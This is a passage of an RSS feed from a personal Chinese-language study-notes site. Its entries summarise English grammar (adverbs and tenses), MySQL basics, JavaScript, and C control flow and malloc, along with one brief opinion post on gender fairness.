大部分的方式副词都是形容词 + ly 构成的，也有一部分是独立的。所以不能单看 ly 来判断某个单词是否是方式副词。比如 hard、fast 这两个没有 ly 结尾，但都是方式副词，而 friendly、lovely 这两个都有 ly 结尾，但是属于形容词，不是方式副词。
 I love you very much. I like your book very much. She cried suddenly. He always does his homework carefully. I speak English slowly.  当一个句子中同时出现多个不同的副词的时候，书写顺序如下：方式副词 —— 地点副词 —— 时间副词
 She did her homework carefully upstairs last night. He is working hard outside now. My borther reads English loudly upstairs every day.</description>
    </item>
    
    <item>
      <title>English 时间副词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E6%97%B6%E9%97%B4%E5%89%AF%E8%AF%8D/</link>
      <pubDate>Sat, 09 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E6%97%B6%E9%97%B4%E5%89%AF%E8%AF%8D/</guid>
      <description>时间副词 表示时间的副词，就是时间副词。
 just now early before recently already just  时间副词数量比较少，副词数量少的原因主要是，表示时间的词语大部分由介词短语构成。
同一句话，其实可以跟两个或两个以上的时间状语，但是要注意逻辑和顺序。通常是短（小范围）的时间状语在前，长（大范围—）的间状语在后。
 I get up early every morning. She goes to bed at 10:30 every night.  时间状语主要作时间状语，大部分在情况放在句尾。
时间副词作时间状语的时候，要特别的注意时态的问题，不同的时间副词，能用在不同的时态里面，有些时间副词不能用在特定的时态。比如
 I am learning English now.  Now Now 主要用在现在进行时态里面，当然，也可以用在其他时态，但当 now 用在其他时态的时候，通常有其他的意思。
 I am busy now. She is tired now. Joe is tired now.  Soon Soon 主要用在一般将来时态。
 I will go home soon. I will be rich soon.</description>
    </item>
    
    <item>
      <title>English 程度副词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E7%A8%8B%E5%BA%A6%E5%89%AF%E8%AF%8D/</link>
      <pubDate>Sat, 09 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E7%A8%8B%E5%BA%A6%E5%89%AF%E8%AF%8D/</guid>
      <description>程度副词 表示某种程度的词语。
比如表示“很、非常、特别、超好、超、相当好、如此、格外的、真正的、完全”的单词。
程度副词相当于一种限定词的作用，主要修饰形容词和方式副词，放在被修饰的形容词和方式副词的前面。
 vary good. so good. too bad. pretty good. almost dead.  Much 这个词语很特使，作程度副词的时候，必须修饰形容词的比较级或方式副词的比较级，表示“&amp;hellip;的多”。
 Much better. Much bigger. Much harder.  程度副词也可以修饰方式副词。
 He is running very quickly. He sings very well. The snail walks pretty.  程度副词只与被修饰的词语有关系，跟句子的关系不大，因此，只要句子中出现形容词和方式副词，都可以根据语境加上程度副词，哪里有形容词和方式副词，哪里就可以又程副词。
 We need a very good teacher. My book is very good. A very rich man married her.  少部分程度副词还可以修饰动词或数词，甚至是名词。
 He nearly died four yeary ago, The man almost dropped his gun,  Very 这个程度副词，不喜欢修饰动词，所以 I very lik you 这个句子不地道，也不太好。应该用 I like you very</description>
    </item>
    
    <item>
      <title>English 频度副词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E9%A2%91%E5%BA%A6%E5%89%AF%E8%AF%8D/</link>
      <pubDate>Sat, 09 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%89%AF%E8%AF%8D/%E9%A2%91%E5%BA%A6%E5%89%AF%E8%AF%8D/</guid>
      <description>频度副词 频度副词也作状语只是位置不同。频度副词放在实义动词前面，放在系动词、助动词、情态动词后面。
 I often eat rice. I always busy. He usually gets up at six.  </description>
    </item>
    
    <item>
      <title>English 现在完成时态</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E7%8E%B0%E5%9C%A8%E5%AE%8C%E6%88%90%E6%97%B6%E6%80%81/</link>
      <pubDate>Thu, 07 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E7%8E%B0%E5%9C%A8%E5%AE%8C%E6%88%90%E6%97%B6%E6%80%81/</guid>
      <description>现在完成时态 由助动词 + have/has + 过去分词构成。
用法一 表示从过去某一时间开始一直延续到现在并还可能继续延续下去的动作。不能用非延续性的动词，比如 die、begin、 buy。
 I have been here for two days. He has been an English teacher for 2 years.  表示过去的动作，对现在产生的影响。
 I have already known the story. She has nerver seen the sea. He has died. I have found her money. She has bought a car.  用法二 第三人称单数 + has + 过去分词
非第三人称单数 + have + 过去分词</description>
    </item>
    
    <item>
      <title>English 现在进行时态</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E7%8E%B0%E5%9C%A8%E8%BF%9B%E8%A1%8C%E6%97%B6%E6%80%81/</link>
      <pubDate>Thu, 07 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E7%8E%B0%E5%9C%A8%E8%BF%9B%E8%A1%8C%E6%97%B6%E6%80%81/</guid>
      <description>现在进行时态 表示主语此时此刻正在进行的动作。一般情况，这个时态没有状态的句子，只有动作的句子。
现在进行时态的注意事项 有一部分动词是不可以用在现在进行时态里面的。
比如表示知觉、结果、态度、情感的词语。
see 表示“看到、看见”的意思，而“看到”是一个结果，没有“我正在看到你”这种逻辑。
所以在英语中，不能说
 I am seeing you.  如果要表示“看”，那可以用 look at. 可以说
 I am looking at you.  同样的，hear（听到）和 listen to（听）也是不能混用的。
现在进行时态的特殊用法 表示目前一段时间内正在进行的动作  What&amp;rsquo;s he doing this week? He is writing a book.（强调这个周一直再写一本书）  表示反复出现或习惯性的动作 现在进行时态常与 always constantly 连用，来表示反复出现或习惯性的动作，类似于一般现在时态的作用。
一般情况，用现在进行时态来表达反复出现或习惯性的动作的时候，主要是强调感情色彩，比如抱怨、表扬、厌倦等等。
 She is always helping her friend.（表扬） You mother is always giving you money.（羡慕或嫉妒） You mother is always gives you money.（没有感情色彩，仅仅表示经常性的动作） You are always borrowing money from me.</description>
    </item>
    
    <item>
      <title>MySQL 基础查询</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E5%9F%BA%E7%A1%80%E6%9F%A5%E8%AF%A2/%E5%9F%BA%E7%A1%80%E6%9F%A5%E8%AF%A2/</link>
      <pubDate>Wed, 06 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E5%9F%BA%E7%A1%80%E6%9F%A5%E8%AF%A2/%E5%9F%BA%E7%A1%80%E6%9F%A5%E8%AF%A2/</guid>
      <description>基础查询 我们用的是名为 MyEmployees.sql 和 Girls.sql 的 SQL 文件。
语法 select 查询列表 from 表名 特点  查询列表可以是表中的字段、常量、表达式、函数。 查询的结果是一个虚拟的表格。  查询表中的单个字段 SELECT last_name FROM employees; 查询表中的多个字段 会以特定的顺序显示我们查询的字段。
SELECT last_name,first_name,email FROM employees; 查询表中的所有字段 会以表原本的字段顺序显示我们查询的字段
SELECT * FROM employees; 区分关键字和字段名 MySQL 中，我们可以用一对着重号**``**来区 MySQL 中的分字段和关键字
SELECT `NAME` FROM rainy; 查询常量 SELECT &amp;#39;john&amp;#39;; 查询表达式 SELECT 100 * 57; 起别名 自定义字段名（列名），起别名可以使我们更好的理解表。
有时候，字段名可能会是一些表达式，会让输出的虚拟表达中的字段名难以理解，这时候，我们可以为其设置一个便于理解的字段名。
表达式可以用这个表达式的别名来代替该表达式 当我们为一个表达式定义了一个别名，如果后续我们需要用到这个表达式，那么我们可以不用再重复书写表达式，直接写别名即可。
SELECT *, # 因为表中没有年薪这个字段，所以我们需要用表达式来计算每个员工的年薪 salary * 12*(1 + IFNULL(commission_pct,0)) AS 年薪 FROM employees # 用表达式所对应的别名来替代表达式，使得语句更好理解 ORDER BY 年薪 DESC; 如果要查询的字段中有重名的情况，也可以使用别名来区分。</description>
    </item>
    
    <item>
      <title>MySQL 条件查询</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E6%9D%A1%E4%BB%B6%E6%9F%A5%E8%AF%A2/%E6%9D%A1%E4%BB%B6%E6%9F%A5%E8%AF%A2/</link>
      <pubDate>Wed, 06 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E6%9D%A1%E4%BB%B6%E6%9F%A5%E8%AF%A2/%E6%9D%A1%E4%BB%B6%E6%9F%A5%E8%AF%A2/</guid>
      <description>条件查询 语法 select # 3、查询 	QueryList from # 1、寻找库中有无指定名 TableName WHERE # 2、筛选满足条件的字段 	Conditional Expression; 分类  按条件表达式查询，主要用条件运算符 按逻辑表达式查询，主要用逻辑运算符 模糊查询，主要用模糊关键字  &amp;gt; 大于。
查询工资大于 12000 的员工信息 SELECT * FROM employees WHERE salary &amp;gt; 12000; &amp;lt; 小于。
= 等于。
&amp;lt;&amp;gt; 不等于，也可以用 !=，但是在 MySQL 中 建议中 &amp;lt;&amp;gt;。
查询部门编号不等于 90 号的员工名和部门编号 SELECT last_name, department_id FROM employees WHERE department_id &amp;lt;&amp;gt; 90; &amp;gt;= 大于等于。
&amp;lt;= 小于等于。</description>
    </item>
    
    <item>
      <title>MySQL 语法规范</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/</link>
      <pubDate>Wed, 06 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/</guid>
      <description>语法规范   MySQL 的 SQL 语法不区分大小写，但建议关键 i 大写，表名，列名小写。
  每条命令结尾必须使用英文的分号;结尾，当然也可以用其他的，比如\g。
  每条命令根据需要，可以进行缩进或换行。
mysql&amp;gt; show  -&amp;gt; databases;   注释
# 单行注释 -- 单行注释 /* 多行注释 */覆   </description>
    </item>
    
    <item>
      <title>MySQL 逻辑查询</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E6%9D%A1%E4%BB%B6%E6%9F%A5%E8%AF%A2/%E9%80%BB%E8%BE%91%E6%9F%A5%E8%AF%A2/</link>
      <pubDate>Wed, 06 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E6%9D%A1%E4%BB%B6%E6%9F%A5%E8%AF%A2/%E9%80%BB%E8%BE%91%E6%9F%A5%E8%AF%A2/</guid>
      <description>逻辑查询 AND 与运算符，也可以用 &amp;amp;&amp;amp;，但是在 MySQL 中，建议用 and。
当表达式都为 true 时，结果才为 true，否则结果为 false。
查询工资在 10000-20000 之间的员工名、工资以及奖金 SELECT last_name, salary, commission_pct FROM employees WHERE salary &amp;gt;= 12000 AND  salary &amp;lt;= 20000; OR 或运算符，但也可以用 ||，但是在 MySQL 中，建议用 or。
当表达式都为 false 时，结果才为 false，否则结果为 true。
查询部门编号不在 90 - 100 之间，或者工资高于 15000 的员工信息 SELECT * FROM employees WHERE # 筛选部门 id 小于 90 或 大于 100 d department_id &amp;lt; 90 OR department_id &amp;gt; 110 OR  salary &amp;gt; 15000; NOT 非运算符，但也可以用 !</description>
    </item>
    
    <item>
      <title>English 一般将来时态</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E4%B8%80%E8%88%AC%E5%B0%86%E6%9D%A5%E6%97%B6%E6%80%81/</link>
      <pubDate>Tue, 05 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E6%97%B6%E6%80%81/%E4%B8%80%E8%88%AC%E5%B0%86%E6%9D%A5%E6%97%B6%E6%80%81/</guid>
      <description>一般将来时态 表示未来即将要发生的动作和状态，也就是说，这些动作和状态还没有发生，但是在将来的某个时间点肯定要发生。
一般将来时态有两种构成方式，will 和 be going to，这两个都是助动词，没有中文意思。虽然它们写法不一样，但是作用是一样的。
一般将来时态的时间状语 一般情况，一般将来时态都需要加上表示将来的时间状语。
 tomorrow. tonight. the day ater tomorrow  大部分表示将来的时间状语，都是由介词或副词 + 其他词语构成。
Next + 表示时间名词的单数  I will travel next year.  After + 具体时间点（&amp;hellip;之后） 这里的具体时间点表示的是特定或规定的时间。
比如：几岁之后、几个月以后、清明节之后、三月之后等等。
 After work Afer school After two days old. After 2030. After May. Afer Ching ming festival. I will buy a house after 2030.  after + 一段时间（之后）
注意 after + 一段时间，比如 after + one/a/an + 表示是时间名词的单数，也可以构成时间状语，但是这种介词短语不能用在一般将来时态，用在一般过去时态。</description>
    </item>
    
    <item>
      <title>为什么男人在一些事情上得忍让女人</title>
      <link>https://note.yxzi.xyz/note/view/bisexual/%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%B7%E4%BA%BA%E5%9C%A8%E4%B8%80%E4%BA%9B%E4%BA%8B%E6%83%85%E4%B8%8A%E5%BE%97%E5%BF%8D%E8%AE%A9%E5%A5%B3%E4%BA%BA/</link>
      <pubDate>Tue, 05 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/bisexual/%E4%B8%BA%E4%BB%80%E4%B9%88%E7%94%B7%E4%BA%BA%E5%9C%A8%E4%B8%80%E4%BA%9B%E4%BA%8B%E6%83%85%E4%B8%8A%E5%BE%97%E5%BF%8D%E8%AE%A9%E5%A5%B3%E4%BA%BA/</guid>
      <description>为什么男人在一些事情上得忍让女人 因为这些事情根本就是些和切身利益无关的无足轻重的事情。比如，女生发小脾气忍让之类的。
我可没见过发国家奖学金的时候男生让了，公司提拔谁时男性让了，父母有一儿一女，分配财产也没见儿子让。
天天听人喊现在本科硕士博士女生比例太高了，要降分录取男生。家庭财产也会向儿子倾斜。至今，各种高管高官，90% 以上都是男性。</description>
    </item>
    
    <item>
      <title>JavaScript DOM</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/dom/dom/</link>
      <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/dom/dom/</guid>
      <description>DOM DOM （文档对象模型）中提供了一系列的方法，DOM 是这一些列方法的统称。这些方法使得我们可以操作 HTML 和 XML。
DOM 就像一棵节点树一样，从文档的根（document），依次分支展开，每一个元素，都可以看作是树的一个节点，每一个元素都是一个对象。
使用 DOM 操作文档中的元素时，必须先加载整个 HTML 文档（body 之前的代码 ），再加载 JS 文件；因为没有完整的 DOM 模型，DOM 的一些操作就无法完成，会导致报错。
graph TD;Node --&amp;gt; Document;Node --&amp;gt; CharacterData;Node --&amp;gt; Element;Node --&amp;gt; Atrr;Document --&amp;gt; HTMLDocument;Document --&amp;gt; XMLDocument;CharacterData --&amp;gt; TextCharacterData --&amp;gt; CommentElement --&amp;gt; HTMLElementAttrHTMLElement --&amp;gt; HTMLHeadElementHTMLElement --&amp;gt; HTMLBodyElementHTMLElement --&amp;gt; HTMLTitleElementHTMLElement --&amp;gt; HTMLParagraphlement Node 最终指向 Object.prototype。
getElementById() getElementById() 定义在了 Document.prototype 上，这说明 XMLDocument 和 HTMLDocument 都能使用 getElementById()，但 Element 不能使用 getElementById()。</description>
    </item>
    
    <item>
      <title>JavaScript ES5 严格模式</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/es5-%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F/</link>
      <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/es5-%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F/</guid>
      <description>ES5 严格模式 ECMAScript 是 JavaScript 的一个标准。
ES5 严格模式指的是：我们应该对 ES3 和 ES5 产生冲突的部分使用哪个版本的规则？
当我们开启 ES5 严格模式后，那么 ES3 和 ES5 产生冲突的部分会遵循 ES5 的规则，否则会使用 ES3（浏览器默认遵循 ES3 的规则）
&amp;ldquo;use strict&amp;rdquo; 使某一作用域内的代码不在兼容 ES3 中的一些不规则的语法，使用全新的 ES5 的语法。
如何启用 ES5 严格模式 在作用域顶端添加语句&amp;quot;use strict&amp;quot;即可，启用之后，ES3 中的一些方法就无法使用了。比如arguments的callee属性：
&amp;#39;use strict&amp;#39;; function test() { 	console.log(arguments.callee); } test(); 浏览器会出现以下错误：
Uncaught TypeError: &amp;#39;caller&amp;#39;, &amp;#39;callee&amp;#39;, and &amp;#39;arguments&amp;#39; properties may not be accessed on strict mode functions or the arguments objects for calls to them 同样，也可以使某一局部作用域支持 ES5，而其他作用域支持 ES3：</description>
    </item>
    
    <item>
      <title>JavaScript Try Catch</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%8E%A7%E5%88%B6%E6%B5%81/try-catch/</link>
      <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E6%8E%A7%E5%88%B6%E6%B5%81/try-catch/</guid>
      <description>Try Catch 为了容错，防止程序报错后引起整个程序的终止运行
try 中有错误信息 就会执行 catch 中的代码，没有这不会执行 catch 之中的代码
catch 有一个参数，参数名自定义 比如 e
那么这个 e 就会有两个参数 e.name 和 e.message
Error.name EvalError：eval()的使用与定义不一致
RangeError：数值越界
ReferenceError：非法或不能识别的引用数值，比如当一个变量未经声明就使用或者一个函数未定义就调用的时候，会出现 ReferenceError。
SyntaxError：语法解析错误
TypeError：操作数类型错误
URlError：URI 处理函数使用不当</description>
    </item>
    
    <item>
      <title>JavaScript with</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/other/with/</link>
      <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/other/with/</guid>
      <description>with with(ogj)函数可以改变自身代码块中的代码的作用域链，它会将 obj 放到它自己代码块中的代码的作用域链的最顶端，也就是会先去 obj 的作用域中去寻找变量。
ES5 中不支持 with 函数。
 var obj = {  age: &amp;#34;456&amp;#34;,  name: &amp;#34;your&amp;#34;, }  function test() {  var age = &amp;#39;123&amp;#39;;  var name = &amp;#39;my&amp;#39;;  with (obj) {  // 下面的输出不会返回自身作用域（test 函数的作用域）下的 age 和 name。  // 只会返回全局作用域下的 obj 对象的 age 和 name，因为作用域被 with 函数改变了。  console.log(age);  console.log(name);  } } test(); 替代链式调用 with (document) {  write(&amp;#34;with 调用&amp;#34; + &amp;#34;&amp;lt;br/&amp;gt;&amp;#34;) }  //等同于 document.</description>
    </item>
    
    <item>
      <title>MySQL</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/mysql/</link>
      <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/mysql/</guid>
      <description>MySQL MySQL 属于 Oracle。
MySQL 的优点  成本低：开源数据库，完全免费，社区庞大。 性能高：执行速度快。 简单：体积小，简单易用。 跨平台：支持多种操作系统。  </description>
    </item>
    
    <item>
      <title>MySql DBMS</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dbms/</link>
      <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dbms/</guid>
      <description>DBMS 数据库管理系统（Datebase Management System），我们可以通过 DBMS 来创建或操作数据库。
常见的数据库管理系统：MySQL、Oracle、DB2、SqlServer
基于共享文件系统 比如微软的 Access
基于 C/S 架构 基于客户机/服务器的 DBMS。需要安装客户端和服务端
比如 MySQL、Oracle、SqlSever。</description>
    </item>
    
    <item>
      <title>MySQL SQL</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/sql/</link>
      <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/sql/</guid>
      <description>SQL 结构化查询语言（Structure Query Language），专门用来对数据库进行一些操作的语言。
SQL 的优点 SQL 语言不是某个特定 DBMS 所专有的语言，相反，近乎所有的 DBMS 都支持 SQL。
SQL 的语言分类 DQL 数据查询语言 select。
DML 数据操作语言，用于对数据库表中的数据进行操作。
SELECT、INSERT、UPDATE、DELETE、CALL、EXPLAIN PLAN、LOCK TABLE
DDL 数据定义语言，用于对数据库、表层面进行操作。
CREATE、ALTER、DROP、TRUNCATE、COMMENT、GRANT、REVOKE
DCL 事务控制语言 COMMIT、SAVEPOINT、ROLLBACK、SET TRANSACTION</description>
    </item>
    
    <item>
      <title>MySQL 安装</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E5%AE%89%E8%A3%85/</link>
      <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E5%AE%89%E8%A3%85/</guid>
      <description>安装 去官方下载PHPStudy并安装，这玩意自带 MySQL 和 Apache。
配置环境变量 赋值 MySQL 目录下的 bin 路径，然后将这个路径添加到系统环境变量 Path 中。
我这里添加环境变量是的是：D:\AppInstallPath\PhpStudy\phpstudy_pro\Extensions\MySQL5.7.26\bin*</description>
    </item>
    
    <item>
      <title>MySQL 常用命令</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</link>
      <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</guid>
      <description>常用命令 查询 MySQL 版本号 打开 cmd，直接使用 DOS 命令查看：
# 第一种命令查询 C:\Windows\system32&amp;gt;mysql --version mysql Ver 14.14 Distrib 5.7.26, for Win64 (x86_64) # 第二种命令查询 C:\Windows\system32&amp;gt;mysql -V mysql Ver 14.14 Distrib 5.7.26, for Win64 (x86_64) 显示数据库 使用show databases;命令来查看数据库，需要注意的是 database 后面的 s 和;符号。
mysql&amp;gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | study | | sys | | typecho | | wordpress | +--------------------+ 7 rows in set (0.</description>
    </item>
    
    <item>
      <title>MySQL 配置文件</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</link>
      <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</guid>
      <description>配置文件 在 MySQL 根目录中，有一个my.ini配置文件。
客户端配置 [mysql]是 MySQL 客户端的配置。
[mysql] default-character-set=utf8 服务端配置 [mysqld] port=3306 # MySQL 服务运行时的端口号 basedir=D:/AppInstallPath/PhpStudy/phpstudy_pro/Extensions/MySQL5.7.26/ # MySQL 程序所存放路径,常用于存放 MySQL 启动、配置文件、日志等 datadir=D:/AppInstallPath/PhpStudy/phpstudy_pro/Extensions/MySQL5.7.26/data/ # MySQL数据存放文件(极其重要) character-set-server=utf8 # 数据库和数据库表的默认字符集。(推荐utf8,以免导致乱码) default-storage-engine=MyIsam # MySQL 的存储引擎 # ...... </description>
    </item>
    
    <item>
      <title>数据库</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E6%95%B0%E6%8D%AE%E5%BA%93/</link>
      <pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E6%95%B0%E6%8D%AE%E5%BA%93/</guid>
      <description>What is 数据库 数据库（Database），通俗的说，它存储了一系列有组织的数据，像一个“仓库”，简称 DB。
为什么要学习数据库？ 数据库可以实现数据的持久化。
使用完整的管理系统对数据进行同意管理，易于查询。
数据库的特点  数据不是直接放到数据库中的，而是先将数据放到表中，再将表放到库中。 一个数据库中可以有多个表，每个表都有一个的名字，用来标识自已，且表名具有唯一性。 表具有一些特性，这些特性定义了数据在表中如何存储。 表由列（字段）组成，每个表都有一个或多个列组成。 表中的数据是按行储存的。  </description>
    </item>
    
    <item>
      <title>C for</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/for/</link>
      <pubDate>Sun, 03 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/for/</guid>
      <description>for 执行 1，判断 2，当 2 为 true 时则执行 A，之后再执行 3，此后一直判断 2，直到 2 为 false 时并结束循环；如果 2 为 false，则直接结束循环。
for(1; 2; 3) {  A; } 其中：
1 只执行一次。
3 执行完后才意味着一次 for 循环执行完毕。
3 执行完后一定会再执行一次 2，且不管表达式 2 的结果为 true 或 false 都会执行一次 2。
#include &amp;lt;stdio.h&amp;gt;int main(void) { 	int sum = 0; 	for (int i = 1;i &amp;lt; 10;i++) 	printf(&amp;#34;%d\n&amp;#34;, i); 	//0 - 10 的自然数。 } 1 - 10 所有奇数之和 #include &amp;lt;stdio.</description>
    </item>
    
    <item>
      <title>C if</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/if/</link>
      <pubDate>Sun, 03 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/if/</guid>
      <description>if 在程序当中,并不是所有的语句都是自上而下依次的执行，有时候会依据条件来选择性的执行某段代码，这个时候就需要用到 if 语句。
如果 1 为真，则执行 A；如果 1 为假，则不执行 A。
#include &amp;lt;stdio.h&amp;gt;int main(void) { 	if (1) 	A； } #include &amp;lt;stdio.h&amp;gt;int main(void) { 	if (2 &amp;gt; 1) 	printf(&amp;#34;if 语句为 true\n&amp;#34;); } if 语句默认只能控制 A，不能控制 B（即无论 1 为 true 还是 false， B 都会执行）。
#include &amp;lt;stdio.h&amp;gt;int main(void) { 	if (1) 	A; 	B; } #include &amp;lt;stdio.h&amp;gt;int main(void) { 	if (2 &amp;gt; 1) 	printf(&amp;#34;被 if 语句控制\n&amp;#34;); 	printf(&amp;#34;不被 if 语句控制\n&amp;#34;); } if 语句默认只能控制一个 A，如果想控制多个语句（A 和 B），就必须将 A 和 B 用 {} 括起来。</description>
    </item>
    
    <item>
      <title>C malloc</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/malloc/</link>
      <pubDate>Sun, 03 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%8C%87%E9%92%88/malloc/</guid>
      <description>malloc malloc 是 memory（内存）allocate（分配）的缩写。
可以让一个变量动态分配内存。
malloc 函数的使用 #include &amp;lt;iostream&amp;gt;#include &amp;lt;malloc.h&amp;gt; int main() {  int a = 5; // a 是一个 int 变量，它是静态分配的  int * p = (int *)malloc(4); // 动态分配  *p = 5;// *p 也是一个 int 变量，但它是动态分配的  free(p); // 手动释放动态分配的内存  printf(&amp;#34;%d\n&amp;#34;,*p);  printf(&amp;#34;%d\n&amp;#34;,p); }  使用 malloc 函数，需要添加头文件 malloc.h malloc 函数只有一个形参，并且形参是整型。 malloc(4)表示请求系统为我们分配 4 个字节 malloc 函数只能返回第一个字节的地址，即 p 只保存了第一个字节的整型地址 int * 是为了让系统知道我们分配这个 4 个字节的地址是整型地址。 int * p = (int *)malloc(4)这行代码总共分配了 8 个字节，int * p分配了 4 个字节，(int *)malloc(4)分配了 84 个字节一共 8 个字节。 p（int * p）本身所占的内存是静态分配的，但 p 所指向的内存(int *)malloc(4)是动态分配的。 free(p)表示将 p 所指向的内存给释放掉，使得 p 指向的内存无法被读写。但是，p 本身的内存是静态的，不能被我们用free()函数手动释放，p 本身的内存只能在 p 变量所在的函数运行结束后，被系统自动释放。 *p = 5和int a = 5的区别在于前者的内存分配方式是动态分配的，后者的内存分配方式是静态分配的。 *p = 5 中，其中*p指的是用(int *)malloc(4)动态分配了 4 个字节的内存空间，而*p = 5，则是将 5 这个 int 数值放入这动态分配的 4 个字节的内存中。而 p 则只保存了其中第 1 个字节的地址。  </description>
    </item>
    
    <item>
      <title>C 流程控制</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/</link>
      <pubDate>Sun, 03 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/</guid>
      <description>流程控制 流程控制也叫控制结构，控制程序应该如何执行代码。
顺序控制 从上到下的执行代码，中间没有任何判断或跳转。
选择控制 某些代码可能执行，也可能不执行，有选择的执行某些代码。
循环控制 某些代码被重复执行。</description>
    </item>
    
    <item>
      <title>English 动词短语和介词短语</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E5%8A%A8%E8%AF%8D%E7%9F%AD%E8%AF%AD%E5%92%8C%E4%BB%8B%E8%AF%8D%E7%9F%AD%E8%AF%AD/</link>
      <pubDate>Sun, 03 Apr 2022 00:00:00 +0000</pubDate>
      
